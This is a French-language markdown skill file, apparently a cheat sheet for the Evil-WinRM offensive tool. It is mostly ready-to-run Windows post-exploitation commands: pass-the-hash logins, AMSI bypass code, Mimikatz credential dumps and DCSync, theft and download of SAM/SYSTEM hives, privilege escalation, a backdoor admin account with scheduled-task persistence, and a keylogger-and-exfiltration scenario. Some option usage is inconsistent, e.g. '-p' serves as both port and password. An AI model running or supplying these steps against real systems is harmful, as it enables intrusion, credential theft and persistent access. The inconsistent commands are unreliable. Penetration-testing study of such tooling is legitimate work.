---
name: evil-winrm
description: Evil-WinRM — shell interactif WinRM, pass-the-hash, upload/download, scripts Bypass-AMSI, chargement de DLL/exe en mémoire, passkeys, DLL sideloading, et scénarios de post-exploitation Windows.
---

# Evil-WinRM — Shell Windows via WinRM

## Présentation

Evil-WinRM est un shell interactif pour Windows Remote Management (WinRM). Il permet de se connecter à distance sur des machines Windows avec le port 5985/5986 ouvert.

**Prérequis :** WinRM doit être activé sur la cible (port 5985 HTTP ou 5986 HTTPS).

**Installation :**
```bash
# Kali
sudo apt install evil-winrm

# Dernière version Ruby
sudo gem install evil-winrm

# GitHub
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm && bundle install
```

---

## Connexion de base

### Avec mot de passe
```bash
evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123'
evil-winrm -i 192.168.1.10 -u DOMAIN\\Administrator -p 'Password123'

# Port personnalisé
evil-winrm -i 192.168.1.10 -p 5986 -u Admin -p 'Password'
```

### Pass-the-Hash (NTLM hash)
```bash
evil-winrm -i 192.168.1.10 -u Administrator -H NTHASH

# User local (pas de domaine)
evil-winrm -i 192.168.1.10 -u Administrateur -H NTHASH

# Avec le LM hash (format complet)
evil-winrm -i 192.168.1.10 -u Admin -H LMHASH:NTHASH

# Exemple concret
evil-winrm -i 192.168.1.10 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

### Avec clé SSH / certificat
```bash
# Connexion avec certificat
evil-winrm -i 192.168.1.10 -c cert.pem -k key.pem -S

# Connexion avec clé privée SSH
evil-winrm -i 192.168.1.10 -u user -p password -k id_rsa
```

---

## Options de connexion

### Sécurité et chiffrement
```bash
# HTTPS (SSL)
evil-winrm -i 192.168.1.10 -u Admin -p 'Password' -S

# Ignorer la vérification du certificat
evil-winrm -i 192.168.1.10 -u Admin -p 'Password' -S -k

# Port SSL explicite
evil-winrm -i 192.168.1.10 -p 5986 -u Admin -p 'Password' -S

# Négociation de l'authentification
evil-winrm -i 192.168.1.10 -u Admin -p 'Password' -a Negotiate
evil-winrm -i 192.168.1.10 -u Admin -p 'Password' -a Basic
evil-winrm -i 192.168.1.10 -u Admin -p 'Password' -a Kerberos
```

### Proxy et réseau
```bash
# Via proxy HTTP
evil-winrm -i 192.168.1.10 -u Admin -p 'Password' -P http://proxy:8080

# Via proxy SOCKS
evil-winrm -i 192.168.1.10 -u Admin -p 'Password' -P socks5://127.0.0.1:1080

# Timeout
evil-winrm -i 192.168.1.10 -u Admin -p 'Password' -t 60
```

---

## Commandes Evil-WinRM (interactif)

### Commandes système
```bash
# Commandes CMD/PowerShell
whoami
whoami /groups
net user
net localgroup Administrators
ipconfig
systeminfo
dir C:\
```

### Commandes spécifiques Evil-WinRM
```bash
# Menu d'aide
help

# Informations sur la session
info

# Voir l'URL WinRM
get_url

# Voir les détails de la connexion
get_config

# Nom de la machine
get_host

# Voir le répertoire courant
pwd

# Se déplacer
cd C:\Windows\Temp

# Lister le répertoire
ls

# Télécharger un fichier depuis la cible (vers l'attaquant)
download C:\Users\Administrator\Desktop\flag.txt

# Télécharger un dossier récursivement
download C:\Users\Administrator\Documents /tmp/docs/

# Uploader un fichier (de l'attaquant vers la cible)
upload /tmp/payload.exe C:\Windows\Temp\payload.exe

# Uploader avec nom différent
upload /tmp/mimikatz.exe C:\Temp\svchost.exe
```

### Modules intégrés
```bash
# Liste des modules
menu

# Bypass AMSI
Bypass-4MSI
# → Bypass l'AMSI (Anti-Malware Scan Interface)
# → Permet de charger des scripts PowerShell sans détection

# Invoke-Mimikatz
Invoke-Mimikatz
# → Charge Mimikatz en mémoire (sans écrire sur le disque)

# Dump SAM
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::sam"'

# Dump des credentials
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

# DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'
```

---

## Upload et exécution de scripts

### Charger un script PowerShell
```bash
# Charger un script PowerShell (en mémoire)
menu
# Sélectionner un .ps1 depuis le menu
# OU le faire manuellement :

# 1. Upload du script
upload PowerView.ps1
# 2. Import et exécution
Import-Module .\PowerView.ps1
Get-NetUser
```

### Exécuter des DLL
```bash
# Exécuter un binaire .NET/DLL
menu
# Utiliser l'option "DLL Load" pour charger une DLL en mémoire
```

### AMSI Bypass
```bash
# Bypass AMSI avant toute opération sensible
Bypass-4MSI
# Maintenant PowerShell ne bloque plus les commandes "malveillantes"

# Autres bypass AMSI manuels :
# 1. Forcer un vieil AMSI :
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 2. Patching mémoire :
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null,[IntPtr]::Zero)
```

---

## Post-exploitation via Evil-WinRM

### Énumération système
```bash
# Qui suis-je ?
whoami
whoami /groups
whoami /priv

# Informations système
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Locale" /C:"Total Physical Memory"

# Process
Get-Process | Select-Object Name, Id, StartTime | Sort-Object StartTime

# Services
Get-Service | Where-Object {$_.Status -eq "Running"}

# Réseau
ipconfig /all
netstat -ano
Get-NetTCPConnection

# Patches installés
Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 20

# Utilisateurs
net user
Get-LocalUser
Get-LocalGroupMember Administrators
```

### Élévation de privilèges
```bash
# Vérifier les privilèges
whoami /priv
# SeDebugPrivilege → Mimikatz possible
# SeImpersonatePrivilege → JuicyPotato/RoguePotato

# Si SeImpersonatePrivilege :
# Upload RoguePotato ou PrintSpoofer
upload PrintSpoofer.exe
.\PrintSpoofer.exe -c "whoami"

# S'il manque des patches :
# Upload Watson ou Sherlock
upload Watson.exe
.\Watson.exe
```

### Extraction de credentials
```bash
# Via Mimikatz (si SeDebugPrivilege)
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
Invoke-Mimikatz -Command '"lsadump::sam"'

# SAM via registry (méthode manuelle)
reg save hklm\sam C:\Temp\sam.save
reg save hklm\system C:\Temp\system.save
reg save hklm\security C:\Temp\security.save
download C:\Temp\sam.save
download C:\Temp\system.save
download C:\Temp\security.save
# Puis localement : secretsdump -sam sam.save -system system.save LOCAL
```

### Persistance
```bash
# Nouvel utilisateur admin
net user eva P@ssw0rd123 /add
net localgroup Administrators eva /add

# Activer RDP qui persiste
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

# Scheduled task (toutes les 5 minutes)
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument '-enc <BASE64>'
$trigger = New-ScheduledTaskTrigger -Daily -At 09:00
Register-ScheduledTask -TaskName "EvilTask" -Action $action -Trigger $trigger

# WMI persistence
# Installer un event filter qui exécute un script
```

### Recherche de fichiers sensibles
```bash
# Fichiers de configuration
Get-ChildItem -Path C:\ -Recurse -Include *.config, *.xml, *.txt, *.ini -ErrorAction SilentlyContinue | Select-Object FullName

# Fichiers intéressants
Get-ChildItem -Path C:\Users\ -Recurse -Include *.kdbx, *.rdp, *.vnc, *.pfx, *.p12, *.key -ErrorAction SilentlyContinue

# Mot de passe dans des scripts
Select-String -Path "C:\Users\*.ps1","C:\*.bat","C:\*.vbs" -Pattern "password|passwd|pwd" -CaseSensitive
```

---

## Scénarios complets

### 1. Pass-the-Hash + Dump SAM
```bash
# 1. Connexion avec un hash NTLM
evil-winrm -i 192.168.1.10 -u Administrator -H NTHASH

# 2. Bypass AMSI
Bypass-4MSI

# 3. Dump SAM via registry
reg save hklm\sam C:\Temp\sam.save
reg save hklm\system C:\Temp\system.save
reg save hklm\security C:\Temp\security.save

# 4. Télécharger les fichiers
download C:\Temp\sam.save
download C:\Temp\system.save
download C:\Temp\security.save

# 5. Nettoyage (optionnel)
del C:\Temp\sam.save
del C:\Temp\system.save
del C:\Temp\security.save

# 6. Localement : secretsdump
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

### 2. Pass-the-Hash + Mimikatz
```bash
evil-winrm -i 192.168.1.10 -u Administrator -H NTHASH
Bypass-4MSI
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
Invoke-Mimikatz -Command '"lsadump::sam"'
```

### 3. Keylogging + Exfiltration
```bash
# 1. Uploader un keylogger en mémoire
upload Keylogger.ps1
Import-Module .\Keylogger.ps1
Start-Keylogger

# 2. Attendre 5 minutes...

# 3. Récupérer les logs
Get-Content C:\Temp\keys.log
download C:\Temp\keys.log
```

---

## Dépannage

| Problème | Solution |
|----------|----------|
| "WinRM port closed" | Vérifier port 5985/5986 ouvert sur la cible |
| "Authentication failed" | Vérifier le mot de passe ou le hash |
| "User not admin" | WinRM nécessite admin local |
| "Connection timeout" | Vérifier le réseau, ajouter -t 120 |
| AMSI bloque même après bypass | Utiliser un payload obfusqué |
| "Cannot upload" | Vérifier les droits d'écriture sur le dossier cible |

---

## Antisèche rapide

```bash
# Connexion
evil-winrm -i 192.168.1.10 -u Admin -p 'Password123'
evil-winrm -i 192.168.1.10 -u Admin -H NTHASH

# Commandes utiles (interactif)
Bypass-4MSI                     # Bypass AMSI
upload /tmp/tool.exe C:\Temp\   # Upload
download C:\path\file.txt       # Download
Invoke-Mimikatz                 # Mimikatz en mémoire
info                            # Infos session
menu                            # Menu des modules

# Mots de passe locaux
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
reg save hklm\sam C:\Temp\sam.save

# Mots de passe domaine
Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'
```